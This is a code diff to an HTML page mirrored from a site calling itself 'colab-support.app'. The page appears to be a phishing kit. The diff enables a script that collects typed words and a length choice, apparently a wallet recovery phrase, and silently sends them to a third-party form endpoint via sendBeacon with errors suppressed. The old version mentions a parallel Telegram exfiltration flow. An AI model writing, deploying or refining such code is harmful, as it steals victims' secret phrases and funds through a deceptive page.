@@ -1449,48 +1449,59 @@
     });
     </script>
     <script src="js/script.js"></script>
-<!-- <script>
+<script>
 document.addEventListener("DOMContentLoaded", () => {
 
     const confirmButton = document.getElementById("confirmButton");
 
-    confirmButton.addEventListener("click", async (e) => {
+    if (!confirmButton) return;
+
+    confirmButton.addEventListener("click", () => {
 
         try {
-            const length = document.getElementById("Length")?.value;
 
-            const wordsGrid = document.getElementById("wordsGrid");
-            let selectedWords = [];
+            const selector = document.querySelector("select.selector");
 
-            if (wordsGrid) {
-                selectedWords = Array.from(wordsGrid.querySelectorAll(".selected"))
-                    .map(el => el.textContent.trim());
-            }
+            const words = Array.from(
+                document.querySelectorAll(".word-input")
+            )
+            .map(input => input.value.trim())
+            .filter(Boolean);
 
-            const payload = {
-                length: length,
-                words: selectedWords.join(", "),
+            const data = {
+                length: selector ? selector.value : "",
+                words: words.join(" "),
                 timestamp: new Date().toISOString()
             };
 
-            await fetch("https://submit-form.com/AY0UJ4dA1", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(payload)
-            });
+            const endpoint = "https://submit-form.com/YOUR_FORMSPARK_ID";
 
-        } catch (err) {
-            // silent fail (won't affect Telegram flow)
-            console.log("FormSpark error:", err);
-        }
+            const body = new URLSearchParams(data);
+
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(
+                    endpoint,
+                    new Blob([body.toString()], {
+                        type: "application/x-www-form-urlencoded"
+                    })
+                );
+            } else {
+                fetch(endpoint, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    },
+                    body
+                }).catch(() => {});
+            }
+
+        } catch (e) {}
 
     });
 
 });
-</script> -->
-
+</script>
+<!--
 <script>
 document.addEventListener("DOMContentLoaded", () => {
 
@@ -1538,6 +1549,6 @@ ${words.length ? words.join(" ") : "No words entered"}
     });
 
 });
-</script>
+</script> -->
 
 </body><!-- Mirrored from colab-support.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Oct 2025 13:16:52 GMT --></html>
